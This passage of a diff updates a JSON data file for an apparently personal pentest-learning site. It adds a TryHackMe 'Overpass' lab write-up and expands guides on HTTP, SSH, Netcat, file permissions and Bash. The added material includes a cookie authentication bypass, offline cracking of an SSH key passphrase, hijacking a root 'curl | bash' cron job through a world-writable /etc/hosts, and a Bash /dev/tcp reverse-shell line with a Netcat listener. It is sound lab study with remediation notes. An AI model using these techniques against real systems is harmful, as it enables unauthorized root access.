@@ -442,6 +442,307 @@
           "result": "I learned the attack path with guidance; independent final root confirmation is not present."
         }
       ]
+    },
+    {
+      "id": "tryhackme-overpass",
+      "title": "Overpass",
+      "platform": "TryHackMe",
+      "date": "2026-11-12",
+      "difficulty": "Easy",
+      "category": "Web authentication + SSH + Linux cron",
+      "status": "SSH access confirmed; root cron redirection prepared; final root-shell result not recorded",
+      "independence": "Web authentication bypass and initial attack-point discovery mostly independent; cron-chain execution developed with guidance; root completion not independently verified",
+      "tags": [
+        "Nmap",
+        "HTTP",
+        "Gobuster",
+        "JavaScript",
+        "cookies",
+        "authentication bypass",
+        "SSH",
+        "encrypted private key",
+        "ssh2john",
+        "John the Ripper",
+        "crontab",
+        "/etc/hosts",
+        "DNS/hostname resolution",
+        "curl",
+        "HTTP server",
+        "Bash",
+        "reverse shell"
+      ],
+      "summary": "I independently found an admin route, investigated its login JavaScript, bypassed client-trusted cookie authentication and recovered an encrypted SSH key. I used John to recover its passphrase and logged in as james. On the host, I identified a root cron job that fetched and executed HTTP script content, alongside a world-writable /etc/hosts file. I set up and confirmed a Kali-hosted script was reachable but did not post a final root-shell verification.",
+      "attackPath": [
+        {
+          "title": "Identify exposed services",
+          "detail": "My full TCP scan of the lab target found only SSH on port 22 and HTTP on port 80. I chose HTTP for initial investigation."
+        },
+        {
+          "title": "Explore the web application",
+          "detail": "I found download and about pages, downloaded the application and inspected it with strings. I noticed a name on the About page but did not confirm it as a login account. Gobuster found /admin."
+        },
+        {
+          "title": "Inspect login logic and control the cookie",
+          "detail": "I read the login JavaScript and observed it set a cookie on success. I manually created a cookie with a random value and reloaded /admin; the protected page became accessible. This points to authentication enforced by client-controlled state."
+        },
+        {
+          "title": "Find an encrypted SSH key",
+          "detail": "The accessible admin content revealed the username james and an SSH private key. The locally saved key was initially rejected because permissions were 0664; chmod 600 fixed the permission warning, but SSH then requested a key passphrase."
+        },
+        {
+          "title": "Recover the passphrase and authenticate",
+          "detail": "I converted the encrypted key to John's format with ssh2john.py and used John with rockyou.txt. John returned a passphrase match. I initially attempted SSH with uppercase James; after switching to lowercase james and using the passphrase, I confirmed an SSH login."
+        },
+        {
+          "title": "Investigate cron as a privilege boundary",
+          "detail": "I proposed checking SUID, capabilities and scheduled tasks and chose cron. /etc/crontab contained a minutely root job: curl overpass.thm/downloads/src/buildscript.sh | bash."
+        },
+        {
+          "title": "Find controllable hostname resolution",
+          "detail": "getent hosts overpass.thm returned 127.0.0.1. I found /etc/hosts owned by root but world writable (-rw-rw-rw-, mode 666), allowing james to change where the hostname resolves."
+        },
+        {
+          "title": "Prepare an HTTP source for cron",
+          "detail": "I set up a Python HTTP server on Kali with the requested /downloads/src/buildscript.sh path. I confirmed the Overpass host could fetch a harmless test script using curl, then reported updating the hosts mapping."
+        },
+        {
+          "title": "Understand the root reverse-shell mechanism",
+          "detail": "I learned how a Bash TCP redirection could connect an interactive shell back to Netcat, and why its privilege would come from the root cron job rather than from the shell code itself. I have not posted callback output or an id command confirming root on Overpass."
+        }
+      ],
+      "methodology": "## How I approached the machine\nI scanned the full TCP range and found SSH and HTTP. I investigated HTTP first because it offered more observable behavior without credentials. I did not jump straight to password guessing: I inspected the site, downloaded the application, used `strings`, enumerated paths with Gobuster and inspected the login JavaScript. I then noticed the login state depended on a cookie I could set myself. Testing that hypothesis exposed the admin page and an SSH key.\n\nWhen SSH rejected the key, I distinguished Linux file permissions from the encryption passphrase protecting the key itself. I fixed the permissions, used `ssh2john.py` and John to test candidate passphrases offline, and corrected the case of the SSH username before successfully connecting.\n\nWith access as `james`, I considered SUID, capabilities and cron. I chose to inspect `/etc/crontab`, where I noticed root was downloading and executing a script every minute. I reasoned that controlling the downloaded script would be a way to execute commands as root. I examined hostname resolution and found `/etc/hosts` was world writable. I used a Kali HTTP server to test reachability and prepared a reverse-shell delivery path with guidance.\n\nMy key learning was to ask *what input can I control in an operation running with higher privileges?* The combination of a controllable hostname mapping and a root `curl | bash` task mattered more than either fact by itself.",
+      "recon": [
+        {
+          "title": "Initial attack surface",
+          "detail": "Only 22/tcp SSH and 80/tcp HTTP appeared open in my full TCP scan.",
+          "commands": [
+            {
+              "label": "Full TCP SYN scan",
+              "code": "nmap -sS -p- <TARGET_IP>",
+              "output": "22/tcp open ssh\n80/tcp open http"
+            }
+          ]
+        },
+        {
+          "title": "HTTP investigation",
+          "detail": "I inspected the About and Download pages, inspected the downloaded app using strings, discovered /admin via Gobuster, and looked at the login JavaScript. I manually set a cookie to a random value and confirmed admin-page access without normal login. I did not preserve the exact script or cookie name.",
+          "commands": [
+            {
+              "label": "Inspect downloaded application",
+              "code": "strings <DOWNLOADED_APP>"
+            },
+            {
+              "label": "Directory discovery",
+              "code": "gobuster dir -u http://<TARGET_IP>/ -w <WORDLIST>"
+            }
+          ]
+        },
+        {
+          "title": "SSH permissions and passphrase",
+          "detail": "I initially saved the key with permission mode 0664, which OpenSSH refused to use. chmod 600 fixed that warning, but the key was encrypted. The uppercase account spelling initially failed, then SSH login succeeded with lowercase james and the recovered key passphrase.",
+          "commands": [
+            {
+              "label": "Protect local key",
+              "code": "chmod 600 <KEY_FILE>"
+            },
+            {
+              "label": "Convert encrypted private key for offline audit",
+              "code": "python3 /usr/share/john/ssh2john.py <KEY_FILE> > <HASH_FILE>"
+            },
+            {
+              "label": "Audit passphrase candidates",
+              "code": "john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>",
+              "output": "1 password hash loaded; 1 match recovered (passphrase intentionally omitted)"
+            },
+            {
+              "label": "Login with recovered key",
+              "code": "ssh -i <KEY_FILE> james@<TARGET_IP>"
+            }
+          ]
+        },
+        {
+          "title": "Root cron job",
+          "detail": "I investigated crontab after obtaining SSH access. The job was configured to run every minute under root and pipe remote HTTP response text into Bash.",
+          "commands": [
+            {
+              "label": "Read system-wide tasks",
+              "code": "cat /etc/crontab",
+              "output": "* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash"
+            }
+          ]
+        },
+        {
+          "title": "Hostname resolution and permissions",
+          "detail": "I observed overpass.thm resolved to loopback and that /etc/hosts was world writable despite being owned by root. I reported updating it to redirect the hostname toward Kali.",
+          "commands": [
+            {
+              "label": "Resolve the name",
+              "code": "getent hosts overpass.thm",
+              "output": "127.0.0.1       overpass.thm"
+            },
+            {
+              "label": "Inspect hosts permissions",
+              "code": "ls -l /etc/hosts",
+              "output": "-rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts"
+            }
+          ]
+        },
+        {
+          "title": "Test attacker-hosted script",
+          "detail": "I prepared a matching file path on Kali and served it with Python's HTTP server. I confirmed a curl request from the Overpass SSH session could fetch the test script. I did not retain proof that the scheduled root job executed the payload.",
+          "commands": [
+            {
+              "label": "Create test script and directory",
+              "code": "mkdir -p ~/overpass-web/downloads/src\ncat > ~/overpass-web/downloads/src/buildscript.sh <<'EOF'\n#!/bin/bash\necho 'Overpass cron test executed'\nid\nEOF"
+            },
+            {
+              "label": "Start HTTP server",
+              "code": "cd ~/overpass-web && python3 -m http.server 80"
+            },
+            {
+              "label": "Check target-to-Kali HTTP reachability",
+              "code": "curl -v http://<KALI_VPN_IP>/downloads/src/buildscript.sh"
+            }
+          ]
+        },
+        {
+          "title": "Reverse-shell concept discussed",
+          "detail": "The Bash reverse-shell line was provided during the guided lesson and I reviewed how stdin, stdout and stderr are redirected to a TCP socket. I have not shared a successful callback or root id.",
+          "commands": [
+            {
+              "label": "Illustrative Bash callback in lab script",
+              "code": "#!/bin/bash\nbash -i >& /dev/tcp/<KALI_VPN_IP>/4444 0>&1"
+            },
+            {
+              "label": "Illustrative listener",
+              "code": "nc -lvnp 4444"
+            }
+          ]
+        }
+      ],
+      "findings": [
+        {
+          "title": "Client-controlled cookie bypassed admin authentication",
+          "evidence": "I observed the web login script set a cookie on successful login, manually set a cookie with an arbitrary value, reloaded /admin and gained access to protected content.",
+          "rootCause": "I inferred the application relied on client-controlled login state rather than verifying an authenticated session server-side.",
+          "impact": "I accessed an admin page and obtained sensitive account/key information without normal login.",
+          "remediation": "I would enforce authentication and authorization server-side for every privileged route, use unguessable server-side sessions, and secure cookies with appropriate attributes.",
+          "validation": "I would verify arbitrary, modified, expired or unsigned cookies never grant access."
+        },
+        {
+          "title": "Encrypted SSH private key exposed with recoverable passphrase",
+          "evidence": "I found an SSH private key in admin content, protected the saved key file with chmod 600, successfully ran ssh2john and recovered a passphrase match using John with rockyou.txt. I later authenticated to SSH as james.",
+          "rootCause": "I traced this to the private key being exposed through an accessible web route and having a passphrase present in a common password list.",
+          "impact": "I used the retrieved key and recovered passphrase to gain remote shell access as james.",
+          "remediation": "I would remove private keys from web content, rotate affected credentials and SSH keys, and protect keys with strong unique passphrases.",
+          "validation": "I would test unauthorized access to administrative assets and verify compromised credentials no longer authenticate."
+        },
+        {
+          "title": "World-writable hosts file combined with root remote-script cron job",
+          "evidence": "I observed a root crontab entry executing curl overpass.thm/downloads/src/buildscript.sh | bash every minute, confirmed hostname resolution to loopback, and saw /etc/hosts had mode 666. I changed the hostname mapping and verified the target could fetch content from my Kali HTTP server.",
+          "rootCause": "I traced the escalation opportunity to unprivileged control over hostname resolution combined with root executing unverified remote HTTP content.",
+          "impact": "I established a plausible path to root code execution, but I have not retained an actual root callback or id result to confirm exploitation.",
+          "remediation": "I would restrict /etc/hosts to root-only writes, avoid executing downloaded scripts through a root cron job, and use trusted scripts with explicit integrity and ownership controls.",
+          "validation": "I would check /etc/hosts is not writable by unprivileged users and that the scheduled task cannot be redirected to untrusted code."
+        }
+      ],
+      "learnings": [
+        "I chose HTTP from an initial SSH/HTTP surface, used Gobuster and inspected application JavaScript instead of immediately attempting brute force.",
+        "I recognized that a cookie set by JavaScript is not sufficient authentication if server-side checks trust user-controlled values.",
+        "I learned that chmod 600 protects the key file's local permissions, but does not remove the encryption passphrase inside an SSH private key.",
+        "I used ssh2john.py to prepare encrypted SSH key data for offline passphrase auditing and John with a wordlist to recover a matching passphrase.",
+        "I learned to pay attention to case-sensitive Linux account names: James and james are different names.",
+        "I suggested SUID, capabilities and cron as candidate local attack surfaces without being told which one to inspect.",
+        "I recognized that a root cron task running curl | bash is dangerous if I can influence what curl retrieves.",
+        "I can interpret -rw-rw-rw- as permission mode 666, even though the file owner is root.",
+        "I learned that /etc/hosts can influence hostname resolution independently of public DNS.",
+        "I understand why a remote Bash reverse shell inherits the privileges of the process that launched it; the reverse shell syntax itself does not elevate privileges.",
+        "I learned that Bash supports /dev/tcp redirection and that 0, 1 and 2 refer to stdin, stdout and stderr."
+      ],
+      "difficulties": [
+        "I initially didn't know that SSH private keys can be protected with an encryption passphrase and confused this with the remote login password.",
+        "I attempted SSH as uppercase James and needed to correct the account name to lowercase james.",
+        "I still want to develop the ability to write unfamiliar shell commands from principles rather than depend on copied one-liners.",
+        "I needed guided instruction to assemble the Kali HTTP delivery path and understand the Bash reverse-shell redirections.",
+        "I have not supplied a final root-shell identity or flag to confirm that the root cron job executed my payload.",
+        "I have not yet submitted an independently written full pentest report for this lab."
+      ],
+      "report": "## Result and evidence limit\nI independently investigated the web application and found a way to access its admin page by creating a client-side cookie with an arbitrary value. The admin content exposed an encrypted SSH private key. I recovered its passphrase through offline wordlist auditing and successfully logged in as `james`.\n\nAfter the SSH foothold, I considered SUID, capabilities and cron as possible local escalation surfaces. The root crontab had a dangerous `curl ... | bash` task, and `/etc/hosts` was world writable. I prepared a Kali-hosted script at the matching URL path, verified the host could fetch it and modified the mapping. My guided work covered a reverse-shell payload and the reason it would execute as root under that cron job. **I have not shared a successful root callback or final `id` output**, so I am not recording root compromise as confirmed.\n\n## Why I made these decisions\nI chose HTTP before SSH because it presented accessible functions I could examine without credentials. Instead of password guessing on `/admin`, I read the application's login logic and questioned whether the server truly validated the cookie. After SSH access, I looked for operations executed under a more privileged identity. A root cron job that runs downloaded script content was more actionable once I learned I could control `/etc/hosts`.\n\n## Security cause and impact\nTwo separate boundaries were weak: the web application's authorization depended on client-controlled state, exposing an SSH private key; and the host allowed an unprivileged user to control resolution of a hostname used by a root task that automatically executed remote code. The first weakness resulted in demonstrated SSH account access. The second provides an escalation path pending final proof.\n\n## What I need to practice next\nI want to find attack points with less guidance, choose verification steps before chasing an exploit and become fluent enough to build shell pipelines and redirections from memory of the mechanism rather than memorizing exact payloads.",
+      "references": [
+        {
+          "label": "TryHackMe Overpass",
+          "url": "https://tryhackme.com/room/overpass"
+        },
+        {
+          "label": "John the Ripper",
+          "url": "https://www.openwall.com/john/"
+        }
+      ],
+      "decisions": [
+        {
+          "signal": "My full scan found 22/tcp SSH and 80/tcp HTTP.",
+          "question": "Where can I learn the most before having credentials?",
+          "decision": "I explored the web application first.",
+          "reason": "Public pages, downloadable client files and scripts could give me clues while SSH required authentication.",
+          "result": "I found Download/About pages and /admin via Gobuster."
+        },
+        {
+          "signal": "The site had an admin login.",
+          "question": "Should I guess passwords or inspect how login works?",
+          "decision": "I read the login JavaScript and investigated cookie behavior.",
+          "reason": "The client-side flow could reveal whether authentication was actually enforced on the server.",
+          "result": "A manually created cookie with a random value provided access to admin content."
+        },
+        {
+          "signal": "The admin page contained a user name and an SSH private key.",
+          "question": "Can the key authenticate me directly?",
+          "decision": "I saved it and tried SSH.",
+          "reason": "SSH was already exposed and the key could provide a valid credential.",
+          "result": "SSH rejected its 0664 local permissions before asking for a passphrase."
+        },
+        {
+          "signal": "After chmod 600, SSH requested an encryption passphrase.",
+          "question": "Is the file encrypted, or does SSH want the remote login password?",
+          "decision": "I learned to distinguish key encryption from account authentication and tested key passphrase candidates offline with ssh2john and John.",
+          "reason": "Offline verification against the encrypted key does not require remote password guessing.",
+          "result": "John recovered one passphrase match; I did not publish the secret."
+        },
+        {
+          "signal": "SSH still failed when I typed James with a capital J.",
+          "question": "Could the account name be wrong even though the key was valid?",
+          "decision": "I tried lowercase james.",
+          "reason": "Linux user names are case-sensitive.",
+          "result": "SSH login succeeded."
+        },
+        {
+          "signal": "I had a shell as james and needed a higher-privilege path.",
+          "question": "Should I check SUID, capabilities or automated tasks?",
+          "decision": "I chose to inspect /etc/crontab.",
+          "reason": "A root-controlled scheduled task may execute attacker-controllable files or commands.",
+          "result": "I found a root task running curl overpass.thm/downloads/src/buildscript.sh | bash every minute."
+        },
+        {
+          "signal": "The cron task downloaded and executed a script under root.",
+          "question": "Can I control the file returned by overpass.thm?",
+          "decision": "I inspected hostname resolution, then /etc/hosts permissions.",
+          "reason": "Changing hostname resolution could change the destination of curl without modifying the protected crontab.",
+          "result": "overpass.thm resolved to 127.0.0.1 and /etc/hosts was world writable."
+        },
+        {
+          "signal": "I could alter /etc/hosts to redirect overpass.thm.",
+          "question": "What would Kali need to serve at the expected path?",
+          "decision": "I set up an HTTP server with a matching /downloads/src/buildscript.sh file and tested fetching it from the target.",
+          "reason": "The pathname and reachability must match before the cron job could obtain my content.",
+          "result": "A direct curl test from the target returned the script, and I reported modifying hosts."
+        },
+        {
+          "signal": "A root cron task could execute a shell payload from my web server.",
+          "question": "Does reverse-shell code itself provide root?",
+          "decision": "I studied bash -i, /dev/tcp, and file-descriptor redirects.",
+          "reason": "The shell receives privileges from its parent process. The network redirection only connects input and output to my listener.",
+          "result": "I understand the mechanism but haven't captured a successful root identity from the actual scheduled execution."
+        }
+      ]
     }
   ],
   "guides": [
@@ -450,15 +751,19 @@
       "title": "HTTP / web applications",
       "category": "Services",
       "kind": "services",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Web applications expose routes, forms and uploads over HTTP.",
-      "content": "HTTP is the request/response protocol I used to reach the Vulnversity upload form. A returned `200 OK` does not necessarily mean the application accepted my action; I need to read the response body.\n\nI examine routes, forms, request bodies and where uploaded files are stored or executed. In Vulnversity, the important surface was a file-upload form rather than the HTTP service version itself.",
+      "content": "HTTP is the request/response protocol I used to reach the Vulnversity upload form. A returned `200 OK` does not necessarily mean the application accepted my action; I need to read the response body.\n\nI examine routes, forms, request bodies and where uploaded files are stored or executed. In Vulnversity, the important surface was a file-upload form rather than the HTTP service version itself.\n\n## Overpass: authentication and script delivery\nI visited the About and Download pages, used Gobuster to find `/admin`, and inspected the login JavaScript. When I manually set a cookie with an arbitrary value and refreshed the page, protected content appeared. This was not about guessing a password; the trust boundary between a client-controlled cookie and server authorization was the attack point.\n\nLater, I used a Python HTTP server to serve `/downloads/src/buildscript.sh`, which was the path referenced by the target's scheduled `curl` job. A direct test from the target could fetch the script. I did not retain proof the scheduled task ran it.",
       "sourceLabs": [
-        "tryhackme-vulnversity"
+        "tryhackme-vulnversity",
+        "tryhackme-overpass"
       ],
       "tags": [
         "HTTP",
-        "uploads"
+        "uploads",
+        "cookies",
+        "client-side login",
+        "remote scripts"
       ],
       "techniques": [
         {
@@ -473,6 +778,35 @@
           ],
           "sourceLabs": [
             "tryhackme-vulnversity"
+          ]
+        },
+        {
+          "title": "Client-side cookie authentication test",
+          "why": "A login form can look secure while a protected route trusts an arbitrary cookie.",
+          "approach": "I inspected the JavaScript, created a cookie with a random value and reloaded `/admin`. The content was accessible. I did not retain the exact cookie name.",
+          "tools": [
+            "tool-gobuster"
+          ],
+          "attackPoints": [
+            "attack-overpass-client-cookie"
+          ],
+          "sourceLabs": [
+            "tryhackme-overpass"
+          ]
+        },
+        {
+          "title": "Serve script for a root cron HTTP fetch",
+          "why": "A scheduled `curl` command may trust content hosted at a controllable destination.",
+          "approach": "I served a script at the exact requested path using Python's HTTP server and verified the target could fetch it. The cron execution itself is not confirmed in my notes.",
+          "tools": [
+            "tool-python-http-server",
+            "tool-curl"
+          ],
+          "attackPoints": [
+            "attack-overpass-cron-hosts"
+          ],
+          "sourceLabs": [
+            "tryhackme-overpass"
           ]
         }
       ]
@@ -584,15 +918,18 @@
       "title": "SSH",
       "category": "Services",
       "kind": "services",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Remote login through an authenticated encrypted connection, usually on port 22.",
-      "content": "SSH allows me to log in and execute commands when an account is authorized. I used key-based authentication in Kenobi: after retrieving `id_rsa`, I set its local mode to `600` and selected it with `ssh -i`.\n\nKnowing a private-key *path* is not enough; I must obtain a usable key, and its public counterpart must be authorized for the account.",
+      "content": "SSH allows me to log in and execute commands when an account is authorized. I used key-based authentication in Kenobi: after retrieving `id_rsa`, I set its local mode to `600` and selected it with `ssh -i`.\n\nKnowing a private-key *path* is not enough; I must obtain a usable key, and its public counterpart must be authorized for the account.\n\n## Overpass: encrypted private key\nThe web admin route exposed an SSH private key for `james`, but saving the text into a file did not remove its encryption. I first had to set local permissions to `600` and then learned the key itself required a passphrase. I converted the key to John's cracking format with `ssh2john.py`, found a matching passphrase with `rockyou.txt` and logged in as lowercase `james`.\n\nThe SSH key's passphrase and the remote account password are separate credentials. Recovering the former can make key-based login possible if the matching public key is authorized.",
       "sourceLabs": [
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
       "tags": [
         "SSH",
-        "keys"
+        "keys",
+        "key passphrase",
+        "offline password audit"
       ],
       "techniques": [
         {
@@ -607,6 +944,21 @@
           ],
           "sourceLabs": [
             "tryhackme-kenobi"
+          ]
+        },
+        {
+          "title": "Encrypted SSH key with recoverable passphrase",
+          "why": "A leaked key can still be passphrase-encrypted; I need to test whether the passphrase is weak before attempting login.",
+          "approach": "I fixed file mode `0664` to `0600`, used `ssh2john.py` and John for offline testing, then authenticated as `james`. I don't store the passphrase.",
+          "tools": [
+            "tool-ssh",
+            "tool-john"
+          ],
+          "attackPoints": [
+            "attack-overpass-exposed-key"
+          ],
+          "sourceLabs": [
+            "tryhackme-overpass"
           ]
         }
       ]
@@ -798,14 +1150,17 @@
       "title": "Netcat (nc)",
       "category": "Tools",
       "kind": "tools",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Connect to TCP ports directly or listen for incoming reverse-shell connections.",
-      "content": "Netcat was useful for two different reasons. For FTP it let me type text-based commands directly to the control port. For the PHP reverse shell it accepted the callback on port `1234`.\n\nA TCP connection alone is not an exploit. It gives me a transport to inspect a protocol or receive an authorized lab connection.",
+      "content": "Netcat was useful for two different reasons. For FTP it let me type text-based commands directly to the control port. For the PHP reverse shell it accepted the callback on port `1234`.\n\nA TCP connection alone is not an exploit. It gives me a transport to inspect a protocol or receive an authorized lab connection.\n\nIn Overpass I learned the Bash TCP reverse-shell mechanism and the listener command on port 4444. I have not retained an actual successful callback from the root cron task.",
       "sourceLabs": [
         "tryhackme-vulnversity",
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
-      "tags": [],
+      "tags": [
+        "reverse shells"
+      ],
       "examples": [
         {
           "title": "FTP control channel",
@@ -818,6 +1173,12 @@
           "language": "bash",
           "code": "nc -lvnp 1234",
           "explanation": "I used this in Vulnversity."
+        },
+        {
+          "title": "Listen for a Bash callback in the lab",
+          "language": "bash",
+          "code": "nc -lvnp 4444",
+          "explanation": "I would verify the remote identity with id after an actual callback; a listening socket alone is not success."
         }
       ],
       "options": [
@@ -951,19 +1312,29 @@
       "title": "ssh client",
       "category": "Tools",
       "kind": "tools",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Authenticate to a remote host with a specified account and optional private key.",
-      "content": "I used a private key obtained during Kenobi rather than a password. I set the local key file's permissions to `600` and used `-i` to choose it.",
+      "content": "I used a private key obtained during Kenobi rather than a password. I set the local key file's permissions to `600` and used `-i` to choose it.\n\n## Overpass case\nI learned to distinguish the local permissions warning from the key encryption prompt. The file was initially `0664`, so I used `chmod 600`; then SSH asked for the passphrase embedded in the private key's encryption. The uppercase login `James` did not work, but lowercase `james` with the recovered passphrase did.",
       "sourceLabs": [
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
-      "tags": [],
+      "tags": [
+        "encrypted keys",
+        "passphrase"
+      ],
       "examples": [
         {
           "title": "Connect with a key",
           "language": "bash",
           "code": "chmod 600 ~/kenobi_id_rsa\nssh -i ~/kenobi_id_rsa kenobi@<TARGET_IP>",
           "explanation": "I authenticated as `kenobi`."
+        },
+        {
+          "title": "Overpass key login and troubleshooting",
+          "language": "bash",
+          "code": "chmod 600 <KEY_FILE>\nssh -i <KEY_FILE> james@<TARGET_IP>\nssh -v -i <KEY_FILE> james@<TARGET_IP>",
+          "explanation": "I use lowercase account name and -v only when I need verbose SSH authentication diagnostics."
         }
       ],
       "options": [
@@ -1022,13 +1393,16 @@
       "title": "strings",
       "category": "Tools",
       "kind": "tools",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Extract readable text from compiled files to find behavioral clues.",
-      "content": "`strings` does not recover the original source code. In Kenobi I found `setuid`, `system`, menu labels and unqualified commands (`curl`, `uname`, `ifconfig`). Those clues made PATH hijacking worth investigating.",
+      "content": "`strings` does not recover the original source code. In Kenobi I found `setuid`, `system`, menu labels and unqualified commands (`curl`, `uname`, `ifconfig`). Those clues made PATH hijacking worth investigating.\n\nIn Overpass I also downloaded the site's client application and inspected it with `strings`. I did not record a specific valuable string, so I treat this as reconnaissance rather than a confirmed vulnerability.",
       "sourceLabs": [
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
-      "tags": [],
+      "tags": [
+        "binaries"
+      ],
       "examples": [
         {
           "title": "Inspect menu strings",
@@ -1278,16 +1652,19 @@
       "title": "Linux ownership, SUID and directory permissions",
       "category": "Fundamentals",
       "kind": "fundamentals",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "File and directory modes control access; SUID changes effective identity for privileged executables.",
-      "content": "`-rwsr-xr-x` on a root-owned binary shows SUID in the owner's execute position. A program may run with root's effective UID while the caller is an unprivileged user. I also learned that file-read permission is not enough if a parent directory such as `/root` denies traversal.\n\nI do not assume that any SUID executable is automatically exploitable; program behavior and authorization matter.",
+      "content": "`-rwsr-xr-x` on a root-owned binary shows SUID in the owner's execute position. A program may run with root's effective UID while the caller is an unprivileged user. I also learned that file-read permission is not enough if a parent directory such as `/root` denies traversal.\n\nI do not assume that any SUID executable is automatically exploitable; program behavior and authorization matter.\n\nIn Overpass, `-rw-rw-rw-` on `/etc/hosts` meant mode `666`: any local user could alter hostname mappings even though the file owner was root. I learned to check the permission bits independently of ownership. This becomes serious when a root process trusts the affected hostname for code retrieval.",
       "sourceLabs": [
         "tryhackme-vulnversity",
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
       "tags": [
         "Linux",
-        "SUID"
+        "SUID",
+        "world-writable",
+        "/etc/hosts"
       ],
       "examples": [
         {
@@ -1301,6 +1678,12 @@
           "language": "bash",
           "code": "ls -l /bin/systemctl",
           "explanation": "Check SUID bit and owner."
+        },
+        {
+          "title": "Check the hosts file's real permissions",
+          "language": "bash",
+          "code": "ls -l /etc/hosts\ntest -w /etc/hosts && echo Writable || echo Not-writable",
+          "explanation": "The mode and the writability test help establish if my shell can influence hostname resolution."
         }
       ]
     },
@@ -1309,16 +1692,20 @@
       "title": "Shell PATH, redirection and script building",
       "category": "Fundamentals",
       "kind": "fundamentals",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Build command lines by understanding variables, search order and output redirection.",
-      "content": "I can explain `export PATH=/home/kenobi/tools/:$PATH`: I put a directory before the old search path, and `$PATH` preserves the existing entries. The shell searches command directories from left to right.\n\nI practiced `>` to save output, `2>&1` to include errors, `chmod +x` to permit script execution, and heredocs to write a small file. I still need to build longer shell commands independently.",
+      "content": "I can explain `export PATH=/home/kenobi/tools/:$PATH`: I put a directory before the old search path, and `$PATH` preserves the existing entries. The shell searches command directories from left to right.\n\nI practiced `>` to save output, `2>&1` to include errors, `chmod +x` to permit script execution, and heredocs to write a small file. I still need to build longer shell commands independently.\n\n## Overpass Bash reverse-shell redirection\nI studied `bash -i >& /dev/tcp/<KALI_VPN_IP>/4444 0>&1`. `bash -i` starts an interactive shell. In Bash, `/dev/tcp/HOST/PORT` in a redirection opens a TCP connection. `>&` redirects stdout and stderr to the connection; `0>&1` redirects stdin to the current stdout destination. File descriptors `0`, `1` and `2` are stdin, stdout and stderr. The network connection doesn't grant root: the Bash process inherits the identity of its parent. In Overpass the intended parent was a root cron task.\n\nI also learned that `curl URL | bash` passes downloaded script bytes directly to a shell. This is dangerous when run privileged against content whose destination or contents an unprivileged account can influence.",
       "sourceLabs": [
         "tryhackme-vulnversity",
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
       "tags": [
         "Bash",
-        "PATH"
+        "PATH",
+        "file descriptors",
+        "/dev/tcp",
+        "cron"
       ],
       "examples": [
         {
@@ -1332,6 +1719,12 @@
           "language": "bash",
           "code": "cat > /tmp/example <<'EOF'\nMy note\nEOF",
           "explanation": "Here-document creates a file without opening an editor."
+        },
+        {
+          "title": "Understand the reverse-shell callback (authorized lab only)",
+          "language": "bash",
+          "code": "#!/bin/bash\nbash -i >& /dev/tcp/<KALI_VPN_IP>/4444 0>&1",
+          "explanation": "I learned this redirection syntax; a successful root callback has not yet been recorded."
         }
       ]
     },
@@ -1340,17 +1733,291 @@
       "title": "How I look for attack points",
       "category": "Methodology",
       "kind": "methodology",
-      "date": "2026-11-11",
+      "date": "2026-11-12",
       "summary": "Move from observation to vulnerability hypothesis, then validate prerequisites and chain useful access.",
-      "content": "## The questions I ask\n1. **What is exposed?** Scan ports, discover forms, enumerate shares and identify actual service versions.\n2. **What is unusual?** Anonymous access, an executable upload, a sensitive path, a suspicious SUID binary or a service with a known issue.\n3. **Can I research it?** Check the specific software/version in SearchSploit or an authoritative advisory. A matching title is only a lead.\n4. **What proof would settle it?** Look for an actual server response, a file copy, a working shell or an observed identity change.\n5. **How can I combine findings?** In Kenobi, SMB disclosed a key path, FTP copied the key and NFS let me retrieve it.\n\nI want to make these decisions myself rather than following a preselected attack chain.",
+      "content": "## The questions I ask\n1. **What is exposed?** Scan ports, discover forms, enumerate shares and identify actual service versions.\n2. **What is unusual?** Anonymous access, an executable upload, a sensitive path, a suspicious SUID binary or a service with a known issue.\n3. **Can I research it?** Check the specific software/version in SearchSploit or an authoritative advisory. A matching title is only a lead.\n4. **What proof would settle it?** Look for an actual server response, a file copy, a working shell or an observed identity change.\n5. **How can I combine findings?** In Kenobi, SMB disclosed a key path, FTP copied the key and NFS let me retrieve it.\n\nI want to make these decisions myself rather than following a preselected attack chain.\n\n## Overpass: evidence-driven decisions\nI scanned all TCP ports, then chose HTTP because it had pages and JavaScript I could examine before having credentials. Rather than guessing passwords, I inspected client-side authentication and tested whether a random cookie opened the admin page. This found a weakness without an exploit database entry.\n\nAfter recovering an encrypted SSH key and logging in, I proposed SUID, capabilities or cron as possible escalation routes, then followed cron. A scheduled root `curl | bash` command was only a vulnerability hypothesis until I found `/etc/hosts` was writable. I then asked whether I could serve the exact file and verified the target could download it. I still need to verify whether the cron job actually executed the remote code as root.\n\nThe recurring question I now want to ask is **what privileged operation consumes an input I can control?** I want to keep evidence, tests and unproven assumptions separate.",
       "sourceLabs": [
         "tryhackme-vulnversity",
-        "tryhackme-kenobi"
+        "tryhackme-kenobi",
+        "tryhackme-overpass"
       ],
       "tags": [
         "enumeration",
         "reasoning",
-        "validation"
+        "validation",
+        "cookie trust",
+        "cron",
+        "attack-chain reasoning"
+      ]
+    },
+    {
+      "id": "tool-gobuster",
+      "title": "Gobuster",
+      "category": "Tools",
+      "kind": "tools",
+      "date": "2026-11-12",
+      "summary": "Enumerate web paths with a wordlist to discover hidden routes.",
+      "content": "I used Gobuster during Overpass HTTP reconnaissance and found `/admin`. A discovered route is a lead: I still need to inspect its functionality and how it enforces authentication.",
+      "sourceLabs": [
+        "tryhackme-overpass"
+      ],
+      "tags": [
